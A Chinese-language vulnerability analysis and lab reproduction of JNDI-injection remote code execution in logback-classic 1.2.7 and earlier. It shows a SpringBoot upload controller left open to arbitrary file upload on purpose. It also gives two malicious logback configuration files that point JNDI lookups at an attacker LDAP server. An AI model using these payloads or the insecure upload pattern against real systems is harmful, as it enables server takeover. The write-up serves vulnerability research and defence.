##  影响版本

logback-classic <=1.2.7

##  测试环境

 SpringBoot 2.6.1 

 JDK 8u111(请注意 JNDI 可利用的版本)

## 复现项目地址

https://github.com/cn-panda/logbackRceDemo

项目是用 SpringBoot 写的一个简单的漏洞 Demo 环境，主要是`UploadController`中的`upload`函数：

```java
public String upload(@RequestParam("file") MultipartFile file) {  
    if (file.isEmpty()) {  
        return "Upload failed, please select a file！！";  
    }  
  
    String fileName = file.getOriginalFilename();  
    String filePath = Thread.currentThread().getContextClassLoader().getResource("").getPath();;  
    System.out.println(filePath);  
    File dest = new File(filePath,fileName);  
    try {  
        file.transferTo(dest);  
        LOGGER.info("Upload succeeded!!");  
        return "Upload succeeded!!";  
    } catch (IOException e) {  
        LOGGER.error(e.toString(), e);  
    }  
    return "Upload failed!!";  
}
```

该函数主要功能是用来上传文件。

项目中 logback 的配置文件如下：

![[../image/Pasted image 20211214164218.png]]

关键点在于`scan`属性，该属性是 logback 用于定时扫描配置文件的变化，若检测到配置文件发生改变，则实时更新加载配置文件

在这里，我故意的写了一个存在任意文件上传的漏洞环境，然后借助 loghack 配置文件中的`scan`属性，配合logback漏洞，实现 RCE

# 漏洞分析

## JNDIConnectionSource
在 logback 中同样类似于log4j1.x 中  JDBCAppender 的 Appender —— **DBAppender**，DBAppender 中有一个名为`ConnectionSource`的接口

该接口提供了一种可插拔式的方式为需要使用 `java.sql.Connection` 的 logback 类获取 JDBC 连接

目前有三种实现类，分别为： `DriverManagerConnectionSource` 、`DataSourceConnectionSource`与 `JNDIConnectionSource`。

这三种实现类每一种都可以用来达到 RCE

但和另外两种实现类不同的是，`JNDIConnectionSource` 实现 RCE 的方式更方便，因为和它可以不借助其他依赖组件的 gadget，仅依靠应用提供的本身机制（JNDI）即可实现 RCE， 但 `DriverManagerConnectionSource` 、`DataSourceConnectionSource`必须依赖 JDBC 反序列漏洞才能够实现 RCE，限制比较大，故这里不做演示。

**JNDIConnectionSource** 是 logback 自带的方法，从名字就可以看出来，它通过 JNDI 获取 javax.sql.DataSource，然后再获取 java.sql.Connection 实例

实际上可以通过观察`JNDIConnectionSource.java`中`getConnection`方法的代码可以发现：

![[../image/Pasted image 20211214155414.png]]

如果dataSource 为空，那么就令`dataSource = lookupDataSource();`

然后在**lookupDataSource()** 中触发 `lookup`:

![[../image/Pasted image 20211214155302.png]]

#### 漏洞复现

首先下载复现源码，然后运行`RceDemoApplication`项目的main 函数：

![[../image/Pasted image 20211214160245.png]]

然后打开浏览器，在地址栏中输入：`http://localhost:8080` 即可访问项目首页

![[../image/Pasted image 20211214160704.png]]

然后在本地创建一个`logback-spring.xml`的配置文件，文件内容如下：

```
<configuration scan="true" scanPeriod="10 seconds" debug="true">  
　　　<appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">  
    　　　　　 <encoder>  
    　　　　　　　　　<pattern>%-4relative [%thread] %-5level %logger{35} - %msg %n</pattern>  
    　　　　　 </encoder>  
    　　　</appender>  
    <appender name="DB" class="ch.qos.logback.classic.db.DBAppender">  
        <connectionSource class="ch.qos.logback.core.db.JNDIConnectionSource">  
            <jndiLocation>ldap://127.0.0.1:1389/erqtcd</jndiLocation>  
        </connectionSource>  
    </appender>  
  
    　　　<root level="DEBUG">  
    　　　　　　<appender-ref ref="STDOUT" />  
    　　　</root>  
</configuration>
```

然后再访问`http://localhost:8080/upload.html`，选择该文件后点击上传按钮，抓包可以看到文件上传成功：

![[../image/Pasted image 20211214163728.png]]

等待十秒钟后，即可成功执行 RCE

![[../image/Pasted image 20211214164425.png]]

## insertFromJNDI

除了`JNDIConnectionSource`外，实际上还有一种配置可以实现 JNDI 注入—— **insertFromJNDI**

`<insertFromJNDI>` 是 logback 的配置标签，用于设置属性的范围，其支持通过 JNDI 的方式来获取属性值，同样的，如果修改`<insertFromJNDI>` 标签的内容，同样可以实现 JNDI 注入

当使用`<insertFromJNDI>` 标签的时候，意味着会调用`InsertFromJNDIAction.java`文件中的`begin`方法，在该方法中会使用`JNDIUtil.lookup` 方法，从而触发漏洞：

![[../image/Pasted image 20211214170343.png]]

### 漏洞复现

和 #JNDIConnectionSource 中复现步骤大致相同，只是上传文件中利用的payload 需要改变，如下：

```
<configuration scan="true" scanPeriod="10 seconds" debug="true">
　　　<appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
    　　　　　 <encoder>
    　　　　　　　　　<pattern>%-4relative [%thread] %-5level %logger{35} - %msg %n</pattern>
    　　　　　 </encoder>
    　　　</appender>
    <insertFromJNDI env-entry-name="ldap://127.0.0.1:1389/erqtcd" as="appName" />  

　　　<root level="DEBUG">
    　　　　　　<appender-ref ref="STDOUT" />
    　　　</root>
</configuration>
```

上传该配置文件：

![[../image/Pasted image 20211214170840.png]]

同样的，等待 10 秒后，即可触发 RCE：

![[../image/Pasted image 20211214171037.png]]

实际上，除了这两个外，`JMXConfiguratorAction`中的`begin`同样可以进行恶意利用

![[../image/Pasted image 20211214175452.png]]

# 总结

总的来说，这个漏洞的触发方式还是比较困难的，除非能够满足以下条件：

1、能够修改或者覆盖 logback 的配置文件
2、能够使得修改的配置文件生效
2、能够使得修改的配置文件生效
